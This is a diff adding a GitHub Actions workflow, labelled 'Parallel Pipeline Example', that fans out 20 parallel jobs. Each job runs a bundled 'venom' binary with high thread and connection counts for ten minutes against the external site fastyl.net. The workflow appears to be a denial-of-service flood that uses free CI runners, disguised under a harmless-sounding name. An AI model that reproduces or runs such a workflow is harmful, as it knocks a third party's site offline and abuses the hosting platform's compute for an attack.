@@ -1,0 +1,24 @@
+name: Parallel Pipeline Example
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: write  # adjust as needed
+
+jobs:
+  parallel-job:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        job-number: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Make venom executable
+        run: chmod +x ./venom
+
+      - name: Run venom
+        run: ./venom -t16 -c10000 -d10m https://fastyl.net/
